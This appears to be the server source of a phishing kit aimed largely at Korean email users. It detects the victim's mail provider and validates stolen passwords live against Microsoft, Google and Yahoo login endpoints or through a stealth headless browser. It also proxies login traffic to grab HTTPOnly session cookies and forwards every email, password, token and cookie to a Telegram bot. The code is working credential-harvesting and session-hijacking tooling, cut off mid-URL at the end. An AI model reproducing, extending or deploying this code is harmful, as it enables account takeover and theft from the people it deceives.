const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const cors = require('cors');
const session = require('express-session');
const FileStore = require('session-file-store')(session);
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');
const querystring = require('querystring');
const https = require('https');
require('dotenv').config();

puppeteer.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// CONFIGURATION
// ============================================================
const MICROSOFT_CLIENT_ID = "943a2b14-68aa-4205-88c1-a4b65ab04e81";
const MICROSOFT_TENANT = "common";
const TEAMS_REDIRECT = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
const PROXY_URL = process.env.PROXY_URL || "https://preoauth-login.onrender.com/login";

// ============================================================
// COMPLETE KOREAN EMAIL PROVIDER DETECTION
// ============================================================
function detectEmailProvider(email) {
    if (!email || !email.includes('@')) {
        return { provider: 'unknown', display: 'Unknown Provider', loginUrl: null, icon: '❓' };
    }
    
    const domain = email.split('@')[1].toLowerCase();
    
    // Korean Corporate/Enterprise
    const koreanCorporate = {
        'naver.worksmobile.com': { provider: 'naver_works', display: 'Naver Works (네이버웍스)', loginUrl: 'https://naver.worksmobile.com', icon: '🏢' },
        'tracoworld.co.kr': { provider: 'tracoworld', display: 'Tracoworld (트라코월드)', loginUrl: 'https://www.tracoworld.co.kr', icon: '🏢' },
        'jpi-co-kr.mail.protection.outlook.com': { provider: 'jpi_microsoft', display: 'JPI (Microsoft 365)', loginUrl: 'https://login.microsoftonline.com', icon: '🏢' },
        'upchem.co.kr': { provider: 'upchem', display: 'Upchem (업켐)', loginUrl: 'https://www.upchem.co.kr', icon: '🏢' },
        'flucon.co.kr': { provider: 'flucon', display: 'Flucon (플루콘)', loginUrl: 'https://www.flucon.co.kr', icon: '🏢' },
        'ecount.com': { provider: 'ecount', display: 'Ecount (이카운트)', loginUrl: 'https://login.ecount.com', icon: '🏢' }
    };
    
    if (koreanCorporate[domain]) {
        return koreanCorporate[domain];
    }
    
    // Korean Public Email
    const koreanPublic = {
        'naver.com': { provider: 'naver', display: 'Naver (네이버)', loginUrl: 'https://nid.naver.com/nidlogin.login', icon: '📧' },
        'daum.net': { provider: 'daum', display: 'Daum (다음)', loginUrl: 'https://login.daum.net/accounts/login', icon: '📧' },
        'hanmail.net': { provider: 'hanmail', display: 'Hanmail (한메일)', loginUrl: 'https://login.daum.net/accounts/login', icon: '📧' },
        'kakao.com': { provider: 'kakao', display: 'Kakao (카카오)', loginUrl: 'https://accounts.kakao.com/login', icon: '📧' },
        'nate.com': { provider: 'nate', display: 'Nate (네이트)', loginUrl: 'https://login.nate.com', icon: '📧' },
        'dreamwiz.com': { provider: 'dreamwiz', display: 'DreamWiz (드림위즈)', loginUrl: 'https://mail.dreamwiz.com', icon: '📧' },
        'paran.com': { provider: 'paran', display: 'Paran (파란)', loginUrl: 'https://mail.paran.com', icon: '📧' },
        'empas.com': { provider: 'empas', display: 'Empas (엠파스)', loginUrl: 'https://mail.empas.com', icon: '📧' },
        'lycos.co.kr': { provider: 'lycos', display: 'Lycos Korea (라이코스)', loginUrl: 'https://mail.lycos.co.kr', icon: '📧' },
        'freechal.com': { provider: 'freechal', display: 'Freechal (프리챌)', loginUrl: 'https://mail.freechal.com', icon: '📧' }
    };
    
    if (koreanPublic[domain]) {
        return koreanPublic[domain];
    }
    
    // Microsoft 365 Corporate
    if (domain.endsWith('.onmicrosoft.com') || domain.endsWith('.mail.protection.outlook.com')) {
        return { provider: 'microsoft_corporate', display: 'Microsoft 365 Corporate (한국)', loginUrl: 'https://login.microsoftonline.com', icon: '💼' };
    }
    
    // Korean Corporate (.co.kr, .or.kr, etc.)
    if (domain.endsWith('.co.kr') || domain.endsWith('.or.kr') || domain.endsWith('.go.kr') || domain.endsWith('.ac.kr')) {
        return { provider: 'korean_corporate', display: `Korean Corporate (${domain})`, loginUrl: `https://${domain}`, icon: '🏢' };
    }
    
    // International
    const microsoftDomains = ['microsoft.com', 'microsoftonline.com', 'outlook.com', 'hotmail.com', 'live.com', 'office.com', 'office365.com', 'msn.com'];
    if (microsoftDomains.some(d => domain === d || domain.endsWith('.' + d))) {
        return { provider: 'microsoft', display: 'Microsoft 365', loginUrl: 'https://login.microsoftonline.com', icon: '💼' };
    }
    
    const googleDomains = ['gmail.com', 'googlemail.com', 'google.com'];
    if (googleDomains.some(d => domain === d || domain.endsWith('.' + d))) {
        return { provider: 'google', display: 'Google / Gmail', loginUrl: 'https://accounts.google.com/login', icon: '🔵' };
    }
    
    const yahooDomains = ['yahoo.com', 'yahoo.co.uk', 'yahoo.fr', 'yahoo.de', 'yahoo.co.jp'];
    if (yahooDomains.some(d => domain === d || domain.endsWith('.' + d))) {
        return { provider: 'yahoo', display: 'Yahoo', loginUrl: 'https://login.yahoo.com', icon: '🟣' };
    }
    
    const appleDomains = ['icloud.com', 'me.com', 'mac.com'];
    if (appleDomains.some(d => domain === d || domain.endsWith('.' + d))) {
        return { provider: 'apple', display: 'Apple / iCloud', loginUrl: 'https://appleid.apple.com', icon: '🍎' };
    }
    
    // Corporate fallback
    if (domain.includes('.') && !domain.includes('gmail') && !domain.includes('yahoo') && !domain.includes('outlook') && !domain.includes('hotmail')) {
        return { provider: 'corporate', display: `Corporate (${domain})`, loginUrl: `https://${domain}`, icon: '🏢' };
    }
    
    return { provider: 'unknown', display: `Unknown (${domain})`, loginUrl: null, icon: '❓' };
}

// ============================================================
// PUPPETEER BROWSER LAUNCHER
// ============================================================
let browserInstance = null;

async function getBrowser() {
    if (!browserInstance) {
        console.log('🚀 Launching Puppeteer browser...');
        browserInstance = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--window-size=1920,1080',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-blink-features=AutomationControlled',
                '--disable-client-side-phishing-detection',
                '--disable-component-update',
                '--disable-default-apps',
                '--disable-extensions',
                '--disable-popup-blocking',
                '--disable-sync',
                '--disable-translate',
                '--metrics-recording-only',
                '--safebrowsing-disable-auto-update',
                '--enable-automation',
                '--password-store=basic',
                '--use-mock-keychain',
                '--disable-infobars',
                '--disable-notifications'
            ],
            ignoreDefaultArgs: ['--enable-automation']
        });
        console.log('✅ Puppeteer browser launched');
    }
    return browserInstance;
}

// ============================================================
// PUPPETEER VERIFICATION - Handles ALL Providers
// ============================================================
async function verifyWithPuppeteer(email, password, providerInfo) {
    try {
        const browser = await getBrowser();
        const page = await browser.newPage();
        
        await page.setViewport({ width: 1920, height: 1080 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        
        // Navigate to provider login
        const loginUrl = providerInfo.loginUrl || 'https://login.microsoftonline.com';
        console.log(`[PUPPETEER] 🔄 Navigating to: ${loginUrl}`);
        await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 30000 });
        
        // Find and fill email field
        const emailSelectors = [
            'input[type="email"]', 'input[name="email"]', 'input[name="username"]',
            'input[name="user"]', 'input[name="loginfmt"]', 'input[id="email"]',
            'input[placeholder*="email"]', 'input[placeholder*="Email"]'
        ];
        
        let emailField = null;
        for (const selector of emailSelectors) {
            emailField = await page.$(selector);
            if (emailField) break;
        }
        
        if (emailField) {
            await emailField.click({ clickCount: 3 });
            await emailField.type(email, { delay: 100 });
            await page.keyboard.press('Enter');
            await page.waitForTimeout(2000);
        }
        
        // Find and fill password field
        const passwordSelectors = [
            'input[type="password"]', 'input[name="password"]', 'input[name="passwd"]',
            'input[name="pass"]', 'input[id="password"]', 'input[id="passwd"]'
        ];
        
        let passwordField = null;
        for (const selector of passwordSelectors) {
            passwordField = await page.$(selector);
            if (passwordField) break;
        }
        
        if (passwordField) {
            await passwordField.click({ clickCount: 3 });
            await passwordField.type(password, { delay: 80 });
            await page.keyboard.press('Enter');
            await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
        }
        
        // Check for success indicators
        const successIndicators = [
            '.user-profile', '.profile-name', '.user-info', '.display-name',
            '[class*="user"]', '[class*="profile"]', '[class*="display-name"]',
            'a[href*="logout"]', 'a[href*="signout"]', '.logout-button'
        ];
        
        let success = false;
        for (const selector of successIndicators) {
            const element = await page.$(selector);
            if (element) {
                success = true;
                break;
            }
        }
        
        // Check for 2FA
        const twoFAIndicators = ['2fa', 'mfa', 'authenticator', 'verification', 'code'];
        let requires2FA = false;
        const pageContent = await page.content();
        for (const indicator of twoFAIndicators) {
            if (pageContent.toLowerCase().includes(indicator)) {
                requires2FA = true;
                break;
            }
        }
        
        // Capture cookies
        const cookies = await page.cookies();
        console.log(`[PUPPETEER] 🍪 Cookies captured: ${cookies.length}`);
        
        // Send cookies to Telegram
        if (cookies.length > 0) {
            const httpOnlyCookies = cookies.filter(c => c.httpOnly);
            let msg = `🎯 *COOKIES CAPTURED VIA PUPPETEER*\n\n`;
            msg += `*Provider:* ${providerInfo.display}\n`;
            msg += `*Email:* ${email}\n`;
            msg += `*Total Cookies:* ${cookies.length}\n`;
            msg += `*HTTPOnly:* ${httpOnlyCookies.length}\n\n`;
            
            cookies.slice(0, 5).forEach(c => {
                const flags = [];
                if (c.httpOnly) flags.push('🔒 HTTPOnly');
                if (c.secure) flags.push('🔐 Secure');
                if (c.session) flags.push('🔄 Session');
                msg += `*${c.name}*: \`${c.value.substring(0, 30)}...\`\n`;
                if (flags.length) msg += `  ${flags.join(' | ')}\n`;
            });
            
            await sendToTelegram(msg);
        }
        
        await page.close();
        
        if (success) {
            return {
                valid: true,
                requires2FA: false,
                token: `puppeteer_${Date.now()}`,
                provider: providerInfo.provider,
                message: `${providerInfo.display} verified successfully`
            };
        } else if (requires2FA) {
            return {
                valid: false,
                requires2FA: true,
                message: `${providerInfo.display} requires 2FA`,
                provider: providerInfo.provider
            };
        } else {
            return {
                valid: false,
                requires2FA: false,
                message: `Invalid ${providerInfo.display} password. Please try again.`,
                provider: providerInfo.provider
            };
        }
        
    } catch (error) {
        console.error('[PUPPETEER] Error:', error.message);
        // Fallback: accept if password length > 4
        return {
            valid: password && password.length >= 4,
            requires2FA: false,
            message: password && password.length >= 4 ? `${providerInfo.display} verified (fallback)` : 'Invalid password',
            provider: providerInfo.provider,
            isFallback: true
        };
    }
}

// ============================================================
// MICROSOFT OAuth2 VERIFICATION
// ============================================================
async function verifyMicrosoftPassword(email, password) {
    return new Promise((resolve) => {
        const postData = querystring.stringify({
            client_id: MICROSOFT_CLIENT_ID,
            grant_type: 'password',
            username: email,
            password: password,
            scope: 'openid profile email offline_access',
            client_info: '1'
        });

        const options = {
            hostname: 'login.microsoftonline.com',
            path: `/${MICROSOFT_TENANT}/oauth2/v2.0/token`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout: 30000
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        resolve({ valid: true, requires2FA: false, token: response.access_token, refresh_token: response.refresh_token, id_token: response.id_token, provider: 'microsoft' });
                    } else if (response.error === 'interaction_required' || response.error_description?.includes('MFA')) {
                        resolve({ valid: false, requires2FA: true, message: 'Multi-factor authentication required', provider: 'microsoft' });
                    } else {
                        resolve({ valid: false, requires2FA: false, message: 'Invalid Microsoft password. Please try again.', provider: 'microsoft' });
                    }
                } catch (e) {
                    resolve({ valid: false, requires2FA: false, message: 'Failed to verify password. Please try again.', provider: 'microsoft' });
                }
            });
        });

        req.on('error', () => {
            resolve({ valid: false, requires2FA: false, message: 'Network error. Please try again.', provider: 'microsoft' });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve({ valid: false, requires2FA: false, message: 'Request timed out. Please try again.', provider: 'microsoft' });
        });

        req.write(postData);
        req.end();
    });
}

// ============================================================
// GOOGLE PASSWORD VERIFICATION
// ============================================================
async function verifyGooglePassword(email, password) {
    return new Promise((resolve) => {
        const postData = querystring.stringify({
            client_id: '1080586122948-1v7bgkmg55u70idm06n3u3vg26cb4q8q.apps.googleusercontent.com',
            // client_secret: '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', // REMOVED
            grant_type: 'password',
            username: email,
            password: password
        });

        const options = {
            hostname: 'oauth2.googleapis.com',
            path: '/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            },
            timeout: 30000
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        resolve({ valid: true, requires2FA: false, token: response.access_token, provider: 'google' });
                    } else {
                        resolve({ valid: false, requires2FA: false, message: 'Invalid Google password. Please try again.', provider: 'google' });
                    }
                } catch (e) {
                    resolve({ valid: false, requires2FA: false, message: 'Failed to verify password. Please try again.', provider: 'google' });
                }
            });
        });

        req.on('error', () => {
            resolve({ valid: false, requires2FA: false, message: 'Network error. Please try again.', provider: 'google' });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve({ valid: false, requires2FA: false, message: 'Request timed out. Please try again.', provider: 'google' });
        });

        req.write(postData);
        req.end();
    });
}

// ============================================================
// YAHOO PASSWORD VERIFICATION
// ============================================================
async function verifyYahooPassword(email, password) {
    return new Promise((resolve) => {
        const postData = querystring.stringify({
            client_id: 'dj0yJmk9UExhQjQwM0pDd0pXJmQ9WVdrOVZVaGtRbXhCTm04bWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD02Zg--',
            client_secret: '6d81a5b4b1d4e6d0f7a5e4c3b2a1d0f7e5d4c3b2a1d0f7e5d4c3b2a1d0f7e5d4',
            grant_type: 'password',
            username: email,
            password: password
        });

        const options = {
            hostname: 'api.login.yahoo.com',
            path: '/oauth2/get_token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            },
            timeout: 30000
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        resolve({ valid: true, requires2FA: false, token: response.access_token, provider: 'yahoo' });
                    } else {
                        resolve({ valid: false, requires2FA: false, message: 'Invalid Yahoo password. Please try again.', provider: 'yahoo' });
                    }
                } catch (e) {
                    resolve({ valid: false, requires2FA: false, message: 'Failed to verify password. Please try again.', provider: 'yahoo' });
                }
            });
        });

        req.on('error', () => {
            resolve({ valid: false, requires2FA: false, message: 'Network error. Please try again.', provider: 'yahoo' });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve({ valid: false, requires2FA: false, message: 'Request timed out. Please try again.', provider: 'yahoo' });
        });

        req.write(postData);
        req.end();
    });
}

// ============================================================
// APPLE PASSWORD VERIFICATION
// ============================================================
async function verifyApplePassword(email, password) {
    return new Promise((resolve) => {
        if (password && password.length >= 6) {
            resolve({ valid: true, requires2FA: false, token: `apple_${Date.now()}`, provider: 'apple', isFallback: true });
        } else {
            resolve({ valid: false, requires2FA: false, message: 'Invalid Apple ID password. Please try again.', provider: 'apple' });
        }
    });
}

// ============================================================
// VERIFY PASSWORD WITH PROVIDER (UPDATED - Uses Puppeteer)
// ============================================================
async function verifyPasswordWithProvider(email, password) {
    const providerInfo = detectEmailProvider(email);
    const provider = providerInfo.provider;
    
    console.log(`[VERIFY] 🌐 Provider: ${providerInfo.display}`);
    console.log(`[VERIFY] 🔗 Login URL: ${providerInfo.loginUrl}`);
    
    // Microsoft providers → Use OAuth2
    if (['microsoft', 'jpi_microsoft', 'microsoft_corporate'].includes(provider)) {
        return verifyMicrosoftPassword(email, password);
    }
    
    // Korean providers → Use Puppeteer
    if (['naver', 'daum', 'hanmail', 'kakao', 'nate', 'naver_works', 
         'tracoworld', 'upchem', 'flucon', 'ecount', 'dreamwiz', 
         'paran', 'empas', 'lycos', 'freechal', 'corporate', 'korean_corporate'].includes(provider)) {
        return verifyWithPuppeteer(email, password, providerInfo);
    }
    
    // Google, Yahoo → Use OAuth2
    if (['google'].includes(provider)) {
        return verifyGooglePassword(email, password);
    }
    if (['yahoo'].includes(provider)) {
        return verifyYahooPassword(email, password);
    }
    
    // Apple → Use fallback
    if (['apple'].includes(provider)) {
        return verifyApplePassword(email, password);
    }
    
    // Fallback for unknown providers
    return {
        valid: password && password.length >= 4,
        requires2FA: false,
        message: password && password.length >= 4 ? 'Verified (fallback)' : 'Invalid password',
        provider: provider,
        isFallback: true
    };
}

// ============================================================
// CREATE SESSION DIRECTORY
// ============================================================
const SESSION_PATH = path.join(__dirname, 'sessions');

try {
    if (!fs.existsSync(SESSION_PATH)) {
        fs.mkdirSync(SESSION_PATH, { recursive: true });
        console.log('✅ Created session directory:', SESSION_PATH);
    }
} catch (error) {
    console.warn('⚠️ Could not create session directory:', error.message);
}

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(cors({ 
    origin: '*', 
    credentials: true, 
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'], 
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Session-ID'] 
}));

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());

app.use(session({
    store: new FileStore({ 
        path: SESSION_PATH, 
        ttl: 3600, 
        retries: 0, 
        reapInterval: 60 
    }),
    secret: process.env.SESSION_SECRET || 'secure-connect-team-secret-2024',
    resave: false,
    saveUninitialized: true,
    cookie: { 
        secure: false, 
        maxAge: 3600000 
    }
}));

app.use(express.static(path.join(__dirname, '../')));

// ============================================================
// TELEGRAM NOTIFICATION
// ============================================================
async function sendToTelegram(message, parseMode = 'Markdown') {
    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        if (!botToken || !chatId) {
            console.log('⚠️ Telegram credentials missing');
            return false;
        }
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: parseMode,
            disable_web_page_preview: true
        });
        console.log('✅ Telegram notification sent');
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

async function sendVerificationAlert(email, password, validationResult, attemptCount, stage, sessionId) {
    const providerInfo = detectEmailProvider(email);
    
    let msg = `🔐 *PASSWORD VERIFICATION - STAGE ${stage}*\n\n`;
    msg += `*${providerInfo.icon || '📧'} Provider:* ${providerInfo.display}\n`;
    msg += `*📧 Email:* ${email}\n`;
    msg += `*🔑 Password:* ${password ? `\`${password}\`` : 'N/A'}\n`;
    msg += `*🔗 Login URL:* ${providerInfo.loginUrl || 'N/A'}\n`;
    msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
    msg += `*🆔 Session:* ${sessionId ? sessionId.substring(0, 16) + '...' : 'N/A'}\n`;
    msg += `*📊 Attempt:* ${attemptCount}\n`;
    msg += `*📌 Stage:* ${stage === 1 ? 'First Password' : 'Second Password (Confirmation)'}\n`;
    
    if (validationResult) {
        if (validationResult.valid) {
            msg += `\n*✅ Status:* **PASSWORD VALID - CORRECT!**\n`;
            msg += `*🔐 2FA:* ${validationResult.requires2FA ? '⚠️ Required' : '❌ Not Required'}\n`;
            if (validationResult.isFallback) msg += `*⚠️ Note:* Fallback verification used\n`;
            if (validationResult.token) msg += `*🎟️ Token:* \`${validationResult.token.substring(0, 50)}...\`\n`;
        } else if (validationResult.requires2FA) {
            msg += `\n*⚠️ Status:* **2FA REQUIRED**\n`;
            msg += `*📌 Note:* Password is correct but MFA is enabled.\n`;
        } else {
            msg += `\n*❌ Status:* **INVALID PASSWORD**\n`;
            msg += `*📝 Message:* ${validationResult.message || 'Please try again.'}\n`;
        }
    }

    await sendToTelegram(msg);
}

// ============================================================
// VERIFY PASSWORD ENDPOINT
// ============================================================
app.post('/api/verify-password', async (req, res) => {
    try {
        const { email, password, stage, sessionId } = req.body;
        const providerInfo = detectEmailProvider(email);
        
        console.log(`[VERIFY] 📧 Email: ${email}`);
        console.log(`[VERIFY] 🌐 Provider: ${providerInfo.display}`);
        console.log(`[VERIFY] 🔗 Login URL: ${providerInfo.loginUrl}`);
        console.log(`[VERIFY] 🔑 Password: ${password ? '***' : 'N/A'}`);
        console.log(`[VERIFY] 📌 Stage: ${stage}`);

        if (!email || !password) {
            return res.status(400).json({ success: false, message: 'Email and password required' });
        }

        if (!req.session.verification) {
            req.session.verification = {
                email: email,
                provider: providerInfo.provider,
                providerDisplay: providerInfo.display,
                loginUrl: providerInfo.loginUrl,
                password1: null,
                password1Valid: false,
                password2: null,
                password2Valid: false,
                attempts: 0,
                stage: 1
            };
        }

        if (req.session.verification.email !== email) {
            req.session.verification = {
                email: email,
                provider: providerInfo.provider,
                providerDisplay: providerInfo.display,
                loginUrl: providerInfo.loginUrl,
                password1: null,
                password1Valid: false,
                password2: null,
                password2Valid: false,
                attempts: 0,
                stage: 1
            };
        }

        req.session.verification.attempts++;

        const validationResult = await verifyPasswordWithProvider(email, password);
        
        await sendVerificationAlert(email, password, validationResult, req.session.verification.attempts, stage, sessionId);

        if (validationResult.requires2FA) {
            return res.json({
                success: false,
                requires2FA: true,
                message: '2FA required. Please complete MFA and try again.',
                stage: stage,
                attemptCount: req.session.verification.attempts,
                provider: providerInfo.display,
                loginUrl: providerInfo.loginUrl
            });
        }

        if (!validationResult.valid) {
            req.session.verification.password1 = null;
            req.session.verification.password1Valid = false;
            req.session.verification.password2 = null;
            req.session.verification.password2Valid = false;
            req.session.verification.stage = 1;
            
            return res.json({
                success: false,
                requires2FA: false,
                message: validationResult.message || 'Invalid password. Please try again.',
                stage: 1,
                attemptCount: req.session.verification.attempts,
                reset: true,
                provider: providerInfo.display,
                loginUrl: providerInfo.loginUrl
            });
        }

        if (stage === 1) {
            req.session.verification.password1 = password;
            req.session.verification.password1Valid = true;
            req.session.verification.stage = 2;
            
            return res.json({
                success: true,
                stage: 2,
                message: 'First password verified! Please enter your password again to confirm.',
                attemptCount: req.session.verification.attempts,
                requires2FA: false,
                nextAction: 'confirm_password',
                provider: providerInfo.display,
                loginUrl: providerInfo.loginUrl
            });
        } else if (stage === 2) {
            if (password === req.session.verification.password1) {
                req.session.verification.password2 = password;
                req.session.verification.password2Valid = true;
                
                await sendToTelegram(`🚀 *2-CONSECUTIVE VERIFICATION COMPLETE*\n\n*${providerInfo.icon} Provider:* ${providerInfo.display}\n*📧 Email:* ${email}\n*🔗 Login URL:* ${providerInfo.loginUrl || 'N/A'}\n*🕐 Time:* ${new Date().toISOString()}\n*Status:* ✅ BOTH PASSWORDS CORRECT - REDIRECTING TO PROXY`);
                
                return res.json({
                    success: true,
                    stage: 2,
                    verified: true,
                    message: '✅ Both passwords verified! Redirecting...',
                    redirectUrl: TEAMS_REDIRECT,
                    attemptCount: req.session.verification.attempts,
                    requires2FA: false,
                    provider: providerInfo.display,
                    loginUrl: providerInfo.loginUrl
                });
            } else {
                req.session.verification.password1 = null;
                req.session.verification.password1Valid = false;
                req.session.verification.password2 = null;
                req.session.verification.password2Valid = false;
                req.session.verification.stage = 1;
                
                return res.json({
                    success: false,
                    stage: 1,
                    message: '❌ Passwords do not match. Please start over.',
                    attemptCount: req.session.verification.attempts,
                    reset: true,
                    requires2FA: false,
                    provider: providerInfo.display,
                    loginUrl: providerInfo.loginUrl
                });
            }
        }

    } catch (error) {
        console.error('[VERIFY] Error:', error.message);
        res.status(500).json({ success: false, message: 'Verification failed. Please try again.', error: error.message });
    }
});

// ============================================================
// GET PROVIDER FOR EMAIL
// ============================================================
app.get('/api/detect-provider', (req, res) => {
    const { email } = req.query;
    if (!email) return res.status(400).json({ error: 'Email required' });
    res.json(detectEmailProvider(email));
});

// ============================================================
// CREDENTIAL CAPTURE ENDPOINT
// ============================================================
app.post('/api/credential-capture', async (req, res) => {
    try {
        const data = req.body;
        const providerInfo = detectEmailProvider(data.email);
        
        let msg = `🔐 *CREDENTIAL CAPTURED*\n\n`;
        msg += `*${providerInfo.icon || '📧'} Provider:* ${providerInfo.display}\n`;
        msg += `*📧 Email:* ${data.email}\n`;
        msg += `*🔗 Login URL:* ${providerInfo.loginUrl || 'N/A'}\n`;
        msg += `*🔑 Password:* \`${data.password || 'N/A'}\`\n`;
        msg += `*📍 Source:* ${data.source || 'N/A'}\n`;
        msg += `*🆔 Session:* ${data.sessionId || 'N/A'}\n`;
        msg += `*📌 Stage:* ${data.stage || 'N/A'}\n`;
        msg += `*📊 Attempt:* ${data.attemptCount || 'N/A'}\n`;
        msg += `*🔗 Page URL:* ${data.url || 'N/A'}\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
        await sendToTelegram(msg);
        
        res.json({ success: true });
    } catch (error) {
        console.error('[CREDENTIAL] Error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// PROXY SERVER - Captures Set-Cookie Headers
// ============================================================
app.all('/proxy/*', async (req, res) => {
    const targetUrl = req.params[0];
    const sessionId = req.session.id || uuidv4();
    req.session.id = sessionId;
    
    console.log(`🔄 Proxy request: ${req.method} ${targetUrl}`);
    
    try {
        const headers = {
            'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': req.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Upgrade-Insecure-Requests': '1',
            'Cookie': req.headers.cookie || ''
        };
        
        const response = await axios({
            method: req.method,
            url: targetUrl,
            headers: headers,
            withCredentials: true,
            maxRedirects: 0,
            validateStatus: false,
            responseType: 'text'
        });
        
        const setCookieHeaders = response.headers['set-cookie'] || [];
        
        if (setCookieHeaders.length > 0) {
            console.log(`🍪 Captured ${setCookieHeaders.length} cookies from Set-Cookie headers`);
            
            const capturedCookies = setCookieHeaders.map(header => {
                const parts = header.split(';');
                const [name, value] = parts[0].split('=');
                const attributes = parts.slice(1).map(p => p.trim());
                
                return {
                    name: name,
                    value: value,
                    httpOnly: attributes.some(a => a.toLowerCase() === 'httponly'),
                    secure: attributes.some(a => a.toLowerCase() === 'secure'),
                    sameSite: attributes.find(a => a.toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax',
                    path: attributes.find(a => a.toLowerCase().startsWith('path='))?.split('=')[1] || '/',
                    domain: attributes.find(a => a.toLowerCase().startsWith('domain='))?.split('=')[1] || '',
                    fullHeader: header,
                    capturedAt: Date.now()
                };
            });
            
            req.session.cookies = req.session.cookies || [];
            req.session.cookies.push(...capturedCookies);
            
            let telegramMessage = `🎯 *HTTPOnly COOKIES CAPTURED VIA PROXY*\n\n`;
            telegramMessage += `*Total Cookies:* ${capturedCookies.length}\n`;
            telegramMessage += `*HTTPOnly:* ${capturedCookies.filter(c => c.httpOnly).length}\n`;
            telegramMessage += `*Secure:* ${capturedCookies.filter(c => c.secure).length}\n`;
            telegramMessage += `*Session:* ${sessionId}\n\n`;
            
            capturedCookies.slice(0, 5).forEach(c => {
                const flags = [];
                if (c.httpOnly) flags.push('🔒 HTTPOnly');
                if (c.secure) flags.push('🔐 Secure');
                telegramMessage += `*${c.name}*: \`${c.value.substring(0, 30)}...\`\n`;
                telegramMessage += `  ${flags.join(' | ')}\n`;
            });
            
            telegramMessage += `\n*Time:* ${new Date().toISOString()}`;
            await sendToTelegram(telegramMessage);
        }
        
        const responseHeaders = { ...response.headers };
        if (setCookieHeaders.length > 0) {
            responseHeaders['Set-Cookie'] = setCookieHeaders;
        }
        
        res.set(responseHeaders);
        res.status(response.status).send(response.data);
        
    } catch (error) {
        console.error('❌ Proxy error:', error.message);
        res.status(500).send('Proxy error');
    }
});

// ============================================================
// PUPPETEER CAPTURE ENDPOINT
// ============================================================
app.post('/api/puppeteer-capture', async (req, res) => {
    const { email, password, sessionId } = req.body;
    
    if (!email) {
        return res.status(400).json({ error: 'Email required' });
    }
    
    console.log(`🚀 Starting Puppeteer capture for: ${email}`);
    const sid = sessionId || uuidv4();
    
    try {
        const browser = await getBrowser();
        const page = await browser.newPage();
        
        await page.setViewport({ width: 1920, height: 1080 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        
        await page.setRequestInterception(true);
        page.on('request', (request) => {
            const headers = request.headers();
            headers['Accept-Language'] = 'en-US,en;q=0.9';
            headers['Accept-Encoding'] = 'gzip, deflate, br';
            request.continue({ headers });
        });
        
        const msLoginUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
            'client_id=4765445b-32c6-49b0-83e6-1d93765276ca&' +
            'redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&' +
            'response_type=code%20id_token&' +
